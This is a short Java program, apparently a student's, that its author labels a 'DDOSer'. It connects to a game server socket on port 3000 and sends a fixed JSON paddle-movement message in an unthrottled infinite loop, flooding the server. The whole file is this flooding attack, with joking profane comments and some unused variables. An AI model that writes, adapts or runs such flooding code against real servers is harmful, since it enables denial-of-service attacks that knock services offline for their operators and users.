import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.io.DataInputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.IOException;
public class SoloDDOS{
//Made By Vladimir, This is the effective DDOSer (only servicing 1 client)
	public static void main(String[] args){
		int port = 6677;
		boolean done = false;
		boolean connected = false;
		boolean ourTurnToSend = true;
		String clientTextSent = new String();
		String emptyString = new String();
		String ip = new String("");
		Scanner in;
		Scanner terminalText = new Scanner(System.in);
		PrintWriter out;
		try{
			Socket chatSocket;
			chatSocket = new Socket(ip,3000);
	//------------------------------------------------------------------------I have a chat socket, HOHOHO--------------------------
			in = new Scanner(chatSocket.getInputStream());
			out = new PrintWriter(chatSocket.getOutputStream());
	//------------------------------------------------------------------------Fully initialised, front-back chat possible------------
			while(done == false){
				out.println("{\"PLAYER_NUMBER\":\"P1\",\"PROTOCOL\":\"PADDLE_MOVEMENT\",\"X\":-293.3333333333334,\"Y\":-230}");out.flush();
			}

		}
		catch(Exception e){
			System.out.println("Shit be whack Yo");
			e.printStackTrace();
		}
	}
}